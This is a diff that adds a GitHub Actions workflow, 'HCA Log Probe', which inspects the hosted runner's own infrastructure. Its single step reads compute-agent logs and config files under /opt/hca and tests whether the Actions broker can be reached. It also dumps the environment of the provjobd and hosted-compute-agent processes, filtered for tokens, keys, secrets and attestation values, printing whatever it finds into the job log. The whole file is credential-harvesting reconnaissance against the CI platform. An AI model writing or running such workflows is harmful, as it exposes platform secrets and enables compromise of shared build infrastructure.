@@ -1,0 +1,47 @@
+name: HCA Log Probe
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Read compute agent logs and config
+        run: |
+          echo "=== HCA agent log (last 100 lines) ==="
+          tail -100 /opt/hca/logs/hosted-compute-agent.log 2>/dev/null || echo "cannot read"
+          
+          echo ""
+          echo "=== HCA directory listing ==="
+          ls -la /opt/hca/ 2>/dev/null
+          
+          echo ""
+          echo "=== HCA config files ==="
+          find /opt/hca -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.toml" -o -name "*.conf" -o -name "*.env" 2>/dev/null | head -10
+          for f in $(find /opt/hca -name "*.json" -o -name "*.yaml" -o -name "*.conf" 2>/dev/null); do
+            echo "--- $f ---"
+            head -20 "$f" 2>/dev/null
+          done
+          
+          echo ""
+          echo "=== Broker service reachability ==="
+          curl -s -w "\n%{http_code}" --max-time 3 "https://broker.actions.githubusercontent.com/" 2>/dev/null | head -3
+          
+          echo ""
+          echo "=== provjobd process info ==="
+          PROVJOBD=$(pgrep -f provjobd)
+          if [ -n "$PROVJOBD" ]; then
+            echo "PID: $PROVJOBD"
+            cat /proc/$PROVJOBD/environ 2>/dev/null | tr '\0' '\n' | grep -iE "token|key|secret|attest|auth" | head -10
+            cat /proc/$PROVJOBD/cmdline 2>/dev/null | tr '\0' ' '
+            echo ""
+            ls -la /proc/$PROVJOBD/fd/ 2>/dev/null | head -10
+          fi
+          
+          echo ""
+          echo "=== HCA agent process environ ==="
+          HCA_PID=$(pgrep -f hosted-compute-agent)
+          if [ -n "$HCA_PID" ]; then
+            echo "HCA PID: $HCA_PID"
+            cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | grep -iE "token|key|secret|attest|auth|orchestrator|broker" | head -10
+          fi
